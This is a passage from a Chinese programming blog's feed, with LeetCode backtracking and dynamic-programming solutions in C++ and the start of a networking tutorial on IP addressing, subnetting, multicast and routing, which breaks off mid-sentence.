class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; candidates, <span class="hljs-type">int</span> target, vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; ans,</span></span><br><span class="hljs-params"><span class="hljs-function">             vector&lt;<span class="hljs-type">int</span>&gt;&amp; combine, <span class="hljs-type">int</span> idx)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (idx == candidates.<span class="hljs-built_in">size</span>()) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (target == <span class="hljs-number">0</span>) &#123;<br>            ans.<span class="hljs-built_in">emplace_back</span>(combine);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 直接跳过</span><br>        <span class="hljs-built_in">dfs</span>(candidates, target, ans, combine, idx + <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 选择当前数</span><br>        <span class="hljs-keyword">if</span> (target - candidates[idx] &gt;= <span class="hljs-number">0</span>) &#123;<br>            combine.<span class="hljs-built_in">emplace_back</span>(candidates[idx]);<br>            <span class="hljs-built_in">dfs</span>(candidates, target - candidates[idx], ans, combine, idx);<br>            combine.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br>    &#125;<br><br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">combinationSum</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; candidates, <span class="hljs-type">int</span> target) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br>        vector&lt;<span class="hljs-type">int</span>&gt; combine;<br><br>        <span class="hljs-built_in">dfs</span>(candidates, target, ans, combine, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="全排列">全排列</h2><blockquote><p>这个问题可以看作有 n个排列成一行的空格，我们需要从左往右依此填入题目给定的 n个数，每个数只能使用一次。那么很直接的可以想到一种穷举的算法，即从左往右每一个位置都依此尝试填入一个数，看能不能填完这n 个空格，在程序中我们可以用「回溯法」来模拟这个过程。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; ans, vector&lt;<span class="hljs-type">int</span>&gt;&amp; output, <span class="hljs-type">int</span> idx, <span class="hljs-type">int</span> len)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (idx == len) &#123;<br>            ans.<span class="hljs-built_in">emplace_back</span>(output);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = idx; i &lt; len; i++) &#123;<br>            <span class="hljs-built_in">swap</span>(output[i], output[idx]);<br>            <span class="hljs-built_in">dfs</span>(ans, output, idx + <span class="hljs-number">1</span>, len);<br>            <span class="hljs-built_in">swap</span>(output[i], output[idx]);<br>        &#125;<br>    &#125;<br><br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">permute</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; ans;<br><br>        <span class="hljs-built_in">dfs</span>(ans, nums, <span class="hljs-number">0</span>, nums.<span class="hljs-built_in">size</span>());<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="单词搜索">单词搜索</h2><blockquote><p>对于每个网格位置，我们尝试从该位置开始查找单词的第一个字符，然后递归地查找其相邻位置以匹配单词的后续字符。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">dfs</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; board, string&amp; word, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j,</span></span><br><span class="hljs-params"><span class="hljs-function">             <span class="hljs-type">int</span> index)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (index == word.<span class="hljs-built_in">length</span>()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || i &gt;= board.<span class="hljs-built_in">size</span>() || j &lt; <span class="hljs-number">0</span> || j &gt;= board[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>() ||<br>            board[i][j] != word[index]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-type">char</span> temp = board[i][j];<br>        board[i][j] = <span class="hljs-string">&#x27;#&#x27;</span>;<br>        <span class="hljs-type">bool</span> found = <span class="hljs-built_in">dfs</span>(board, word, i - <span class="hljs-number">1</span>, j, index + <span class="hljs-number">1</span>) ||<br>                     <span class="hljs-built_in">dfs</span>(board, word, i + <span class="hljs-number">1</span>, j, index + <span class="hljs-number">1</span>) ||<br>                     <span class="hljs-built_in">dfs</span>(board, word, i, j - <span class="hljs-number">1</span>, index + <span class="hljs-number">1</span>) ||<br>                     <span class="hljs-built_in">dfs</span>(board, word, i, j + <span class="hljs-number">1</span>, index + <span class="hljs-number">1</span>);<br>        board[i][j] = temp;<br><br>        <span class="hljs-keyword">return</span> found;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">exist</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; board, string word)</span> </span>&#123;<br>        <span class="hljs-type">int</span> rows = board.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> cols = board[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rows; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; cols; j++) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">dfs</span>(board, word, i, j, <span class="hljs-number">0</span>)) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="动态规划相关问题">3. 动态规划相关问题</h1><h2 id="斐波那契数">斐波那契数</h2><blockquote><p>使用了<strong>迭代</strong>的方法，而不是直接使用递归，来计算斐波那契数列。通过使用三个变量<code>p</code>, <code>q</code>,<code>r</code>，该算法避免了递归所带来的栈空间开销。<code>p</code>用来存储 (<code>F(i-2)</code>)，初始值为 <code>0</code>；<code>q</code>用来存储 (<code>F(i-1)</code>)，初始值为 <code>1</code>；<code>r</code>用来存储当前项 (<code>F(i)</code>)，初始值为 <code>1</code>。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>public:<br>    <span class="hljs-built_in">int</span> fib(<span class="hljs-built_in">int</span> n) &#123;<br>        <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">return</span> n;<br>        &#125;<br><br>        <span class="hljs-built_in">int</span> p = <span class="hljs-number">0</span>, q = <span class="hljs-number">0</span>, r = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++) &#123;<br>            p = q;<br>            q = r;<br>            r = p + q;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="爬楼梯">爬楼梯</h2><blockquote><p>我们用 f(x) 表示爬到第 x级台阶的方案数，考虑最后一步可能跨了一级台阶，也可能跨了两级台阶，所以我们可以列出如下式子：<code>f(x)=f(x−1)+f(x−2)</code>。它意味着爬到第x 级台阶的方案数是爬到第 x−1 级台阶的方案数和爬到第 x−2级台阶的方案数的和。很好理解，因为每次只能爬 1 级或 2 级，所以 f(x)只能从 f(x−1) 和 f(x−2)转移过来，而这里要统计方案总数，我们就需要对这两项的贡献求和。以上是动态规划的转移方程，下面我们来讨论边界条件。我们是从第0 级开始爬的，所以从第 0 级爬到第 0 级我们可以看作只有一种方案，即f(0)=1；从第 0 级到第 1级也只有一种方案，即爬一级，f(1)=1。这两个作为边界条件就可以继续向后推导出第n 级的正确结果。我们不妨写几项来验证一下，根据转移方程得到f(2)=2，f(3)=3，f(4)=5，……，我们把这些情况都枚举出来，发现计算的结果是正确的。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">climbStairs</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>, q = <span class="hljs-number">0</span>, r = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            p = q;<br>            q = r;<br>            r = p + q;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最大子数组和">最大子数组和</h2><blockquote><p>用 f(i) 代表以第 i个数结尾的「连续子数组的最大和」，因此我们只需要求出每个位置的f(i)，然后返回 f 数组中的最大值即可。那么我们如何求 f(i)呢？我们可以考虑 nums[i] 单独成为一段还是加入 f(i−1)对应的那一段，这取决于 nums[i] 和 f(i−1)+nums[i]的大小，我们希望获得一个比较大的，于是可以写出这样的动态规划转移方程：<code>f(i)=max&#123;f(i−1)+nums[i],nums[i]&#125;</code>。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = nums[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> pre = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            pre = <span class="hljs-built_in">max</span>(pre + num, num);<br>            ans = <span class="hljs-built_in">max</span>(ans, pre);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="打家劫舍">打家劫舍</h2><blockquote><p>如果只有一间房屋，则偷窃该房屋，可以偷窃到最高总金额。如果只有两间房屋，则由于两间房屋相邻，不能同时偷窃，只能偷窃其中的一间房屋，因此选择其中金额较高的房屋进行偷窃，可以偷窃到最高总金额。如果房屋数量大于两间，应该如何计算能够偷窃到的最高总金额呢？对于第k (k&gt;2) 间房屋，有两个选项：</p><ul><li><p>偷窃第 k 间房屋，那么就不能偷窃第 k−1 间房屋，偷窃总金额为前 k−2间房屋的最高总金额与第 k 间房屋的金额之和。</p></li><li><p>不偷窃第 k 间房屋，偷窃总金额为前 k−1间房屋的最高总金额。</p></li></ul><p>在两个选项中选择偷窃总金额较大的选项，该选项对应的偷窃总金额即为前 k间房屋能偷窃到的最高总金额。用 dp[i] 表示前 i间房屋能偷窃到的最高总金额，那么就有如下的状态转移方程：<code>dp[i]=max(dp[i−2]+nums[i],dp[i−1])</code>。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> size = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (size == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>];<br>        &#125;<br><br>        <span class="hljs-type">int</span> first = nums[<span class="hljs-number">0</span>], second = <span class="hljs-built_in">max</span>(nums[<span class="hljs-number">0</span>], nums[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; size; i++) &#123;<br>            <span class="hljs-type">int</span> temp = second;<br>            second = <span class="hljs-built_in">max</span>(first + nums[i], second);<br>            first = temp;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> second;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最长递增子序列">最长递增子序列</h2><blockquote><p>定义 dp[i] 为考虑前 i 个元素，以第 i个数字结尾的最长上升子序列的长度，注意 nums[i]必须被选取。我们从小到大计算 dp 数组的值，在计算 dp[i]之前，我们已经计算出 dp[0…i−1]的值，则状态转移方程为：<code>dp[i]=max(dp[j])+1</code>,其中0≤j&lt;i且num[j]&lt;num[i]。即考虑往dp[0…i−1] 中最长的上升子序列后面再加一个 nums[i]。由于 dp[j] 代表nums[0…j] 中以 nums[j] 结尾的最长上升子序列，所以如果能从 dp[j]这个状态转移过来，那么 nums[i] 必然要大于 nums[j]，才能将 nums[i] 放在nums[j] 后面以形成更长的上升子序列。最后，整个数组的最长上升子序列即所有dp[i] 中的最大值。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lengthOfLIS</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> size = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">dp</span><span class="hljs-params">(size)</span></span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>            dp[i] = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++) &#123;<br>                <span class="hljs-keyword">if</span> (nums[j] &lt; nums[i]) &#123;<br>                    dp[i] = <span class="hljs-built_in">max</span>(dp[i], dp[j] + <span class="hljs-number">1</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> *<span class="hljs-built_in">max_element</span>(dp.<span class="hljs-built_in">begin</span>(), dp.<span class="hljs-built_in">end</span>());<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IP篇</title>
    <link href="/2024/05/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%9B%BE%E8%A7%A3%E7%BD%91%E7%BB%9C/IP%E7%AF%87/"/>
    <url>/2024/05/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A0%B8%E5%BF%83%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%9B%BE%E8%A7%A3%E7%BD%91%E7%BB%9C/IP%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="ip">1. IP</h1><h2 id="ip作用">1.1 IP作用</h2><p>IP 在 TCP/IP参考模型中处于第三层，也就是<strong>网络层</strong>。网络层的主要作用是：<strong>实现主机与主机之间的通信，也叫点对点（endtoend）通信。</strong>IP的主要作用是：在复杂的网络环境中将数据包发送给最终目的主机。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604672.png"alt="image-20240511133540139" /><figcaption aria-hidden="true">image-20240511133540139</figcaption></figure><h2 id="ip与mac">1.2 IP与MAC</h2><ul><li>IP ：没有直连的两个网络之间进行通信传输</li><li>MAC ：直连的两个设备之间进行通信传输</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604673.png"alt="image-20240511134142714" /><figcaption aria-hidden="true">image-20240511134142714</figcaption></figure><p>在网络中数据包传输过程中，源IP地址和目标IP地址是不会变化的（前提：没有使用NAT 网络），只有源 MAC 地址和目标 MAC 一直在变化。</p><h2 id="分片重组">1.3 分片重组</h2><p>每种数据链路的最大传输单元 <code>MTU</code> 都是不相同的，如 FDDI数据链路 MTU 4352、以太网的 MTU 是 1500字节等。这是因为每个不同类型的数据链路的使用目的不同。当 IP数据包大小大于 MTU 时， IP 数据包就会被分片。经过分片之后的 IP数据报在被重组的时候，只能由目标主机进行，路由器是不会进行重组的。假设发送方发送一个4000 字节的大数据报，若要传输在以太网链路，则需要把数据报分片成 3个小数据报进行传输，再交由接收方重组成大数据报。在分片传输中，一旦某个分片丢失，则会造成整个IP 数据报作废，所以 TCP 引入了 <code>MSS</code> 也就是在 TCP层进行分片不由 IP 层分片，那么对于 UDP 我们尽量不要发送一个大于<code>MTU</code> 的数据报文。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604674.png"alt="image-20240511150735978" /><figcaption aria-hidden="true">image-20240511150735978</figcaption></figure><h1 id="ip地址">2. IP地址</h1><h2 id="网卡">2.1 网卡</h2><p><strong>网卡</strong>是一个专门负责网络通讯的<strong>硬件设备</strong>，而<strong>IP地址</strong>是设置在网卡上的<strong>地址信息</strong>。我们可以把电脑比作电话，网卡相当于SIM卡，IP地址相当于电话号码。</p><h2 id="点分十进制">2.2 点分十进制</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604675.png"alt="image-20240511134814785" /><figcaption aria-hidden="true">image-20240511134814785</figcaption></figure><h2 id="有类地址">2.3 有类地址</h2><p>IP 地址有 5 种类型，分别是 A 类、B 类、C 类、D 类、E类。黄色部分为分类号，用以区分 IP 地址类别。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604676.png"alt="image-20240511135512402" /><figcaption aria-hidden="true">image-20240511135512402</figcaption></figure><h3 id="abc类地址">2.3.1 A、B、C类地址</h3><p>A、B、C 类主要分为两个部分，分别是<strong>网络号和主机号</strong>。A、B、C 分类对应的地址范围、最大主机个数如下图所示。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604677.png"alt="image-20240511135757488" /><figcaption aria-hidden="true">image-20240511135757488</figcaption></figure><blockquote><p>最大主机数计算公式：2<sup>^主机号位数</sup>-2（减去网络地址和广播地址）</p><ul><li><p>网络地址：主机号全为0</p></li><li><p>广播地址：主机号全为1（用于在同一个链路中相互连接的主机之间发送数据包）</p></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604678.png"alt="image-20240511140207982" /><figcaption aria-hidden="true">image-20240511140207982</figcaption></figure></blockquote><blockquote><ul><li>本地广播：在本网络内广播的叫做本地广播。例如网络地址为192.168.0.0/24 的情况下，广播地址是 192.168.0.255 。因为这个广播地址的IP 包会被路由器屏蔽，所以不会到达 192.168.0.0/24 以外的其他链路上。</li><li>直接广播：在不同网络之间的广播叫做直接广播。例如网络地址为192.168.0.0/24 的主机向 192.168.1.255/24 的目标地址发送 IP包。收到这个包的路由器，将数据转发给 192.168.1.0/24，从而使得所有192.168.1.1~192.168.1.254的主机都能收到这个包（由于直接广播有一定的安全问题，多数情况下会在路由器上设置为不转发）。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604679.png"alt="image-20240511140621257" /><figcaption aria-hidden="true">image-20240511140621257</figcaption></figure></blockquote><h3 id="de类地址">2.3.2 D、E类地址</h3><p>D 类和 E 类地址是没有主机号的，所以不可用于主机 IP。D类常被用于<strong>多播</strong>，E 类是预留的分类，暂时未使用。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604680.png"alt="image-20240511140825395" /><figcaption aria-hidden="true">image-20240511140825395</figcaption></figure><h4 id="多播定义">2.3.2.1 多播定义</h4><p>多播：将包发送给特定组内的所有主机。老师说：“最后一排的同学，上来做这道数学题。”，老师指定的是最后一排的同学，这就是多播。</p><h4 id="多播用途">2.3.2.2 多播用途</h4><p>由于广播无法穿透路由，若想给其他网段发送同样的包，就可以使用可以穿透路由的多播。多播使用的D 类地址，其前四位是 <code>1110</code> 就表示是多播地址，而剩下的 28位是多播的组编号。从 224.0.0.0 ~ 239.255.255.255都是多播的可用范围，其划分为以下三类：</p><ul><li>224.0.0.0 ~ 224.0.0.255为预留的组播地址，只能在局域网中，路由器是不会进行转发的。</li><li>224.0.1.0 ~ 238.255.255.255为用户可用的组播地址，可用于因特网上。</li><li>239.0.0.0 ~ 239.255.255.255为本地管理组播地址，可供内部网在内部使用，仅在特定的本地范围内有效。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604681.png"alt="image-20240511141628347" /><figcaption aria-hidden="true">image-20240511141628347</figcaption></figure><h3 id="优缺点">2.3.3 优缺点</h3><h4 id="优点">2.3.3.1 优点</h4><p>简单明了、选路（基于网络地址）简单。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604682.png"alt="image-20240511142120494" /><figcaption aria-hidden="true">image-20240511142120494</figcaption></figure><h4 id="缺点">2.3.3.2 缺点</h4><ul><li>网络设计局限性：比如一个公司里用了 B类地址，但是可能需要根据生产环境、测试环境、开发环境来划分地址层次，而这种IP 分类是没有地址层次划分的功能。</li><li>IP地址不灵活：例如，拥有 300 台设备的组织无法使用 C 类 IP地址，该类只允许连接 254 台设备。因此，该组织不得不申请 B 类 IP地址，该类提供 65534 个唯一的主机地址。但是，只需要连接 300台设备，这就会剩下 65234 个未使用的 IP 地址空间。</li></ul><h2 id="无类地址">2.4 无类地址</h2><ul><li><strong>无类别域间路由 (CIDR)</strong> 是一种 <strong>IP地址分配方法</strong>，可提高互联网上的数据路由效率。每台连接到互联网的计算机、服务器和最终用户设备都有一个与之关联的唯一编号，称为IP 地址。设备通过使用这些 IP 地址相互查找和通信。组织使用 CIDR在其网络中灵活高效地分配 IP 地址。</li><li><strong>无类别域间路由 (CIDR)</strong> 使用<strong>可变长度子网掩码(VLSM)</strong> 来改变 IP地址中网络地址位和主机地址位之间的比率。子网掩码是一组标识符，通过将主机地址变为零，从IP 地址返回网络地址的值（按位与运算）。 VLSM序列允许网络管理员<strong>将 IP地址空间分解为不同大小的子网</strong>。每个子网可以有灵活的主机数量和有限的IP 地址数量。CIDR IP 地址在普通 IP地址的基础上附加了一个后缀值，说明网络地址前缀位数。例如，10.100.122.2/24是一个 IPv4 CIDR 地址，其中前 24 位（即 10.100.122）是网络地址。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604683.png"alt="image-20240511143244963" /><figcaption aria-hidden="true">image-20240511143244963</figcaption></figure><h2 id="公有ip和私有ip">2.5 公有IP和私有IP</h2><p>在 A、B、C 分类地址中，IP地址包括公有 IP 地址和私有 IP 地址。私有 IP地址通常是内部的 IT 人员管理，公有 IP 地址是由<code>ICANN</code>（互联网名称与数字地址分配机构） 组织管理。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405111604684.png"alt="image-20240511144308103" /><figcaption aria-hidden="true">image-20240511144308103</figcaption></figure><h2 id="路由控制">2.6 路由控制</h2><p>IP地址的<strong>网络地址部分</strong>用于进行路由控制。路由表中记录着网络地址与下一步应该发送的路由器地址。在主机和路由器上都会有各自的路由表。在发送IP 包时，首先要确定 IP包首部中的目标地址，再从路由表中找到与该地址具有相同网络地址的记录，根据该记录将IP包转发给相应的下一个路由器。如果路由表中存在多条相同网络地址的记录，就选择相同位数最多的网络地址，也就是最长前缀匹配。</p><p>下面以下图的网络链路作为例子说明：</p><ol type="1"><li>主机 A 要发送一个 IP 包，其源地址是 <code>10.1.1.30</code>和目标地址是 <code>10.1.2.10</code>，由于没有在主机 A的路由表找到与目标地址 <code>10.1.2.10</code>相同的网络地址，于是包被转发到默认路由（路由器 <code>1</code> ）；</li><li>路由器 <code>1</code> 收到 IP 包后，也在路由器 <code>1</code>的路由表匹配与目标地址相同的网络地址记录，发现匹配到了，于是就把 IP数据包转发到了 <code>10.1.0.2</code> 这台路由器 <code>2</code>；</li><li>路由器 <code>2</code>收到后，同样对比自身的路由表，发现匹配到了，于是把 IP 包从路由器<code>2</code> 的 <code>10.1.2.1</code> 这个接口出去，最终经过交换机把IP 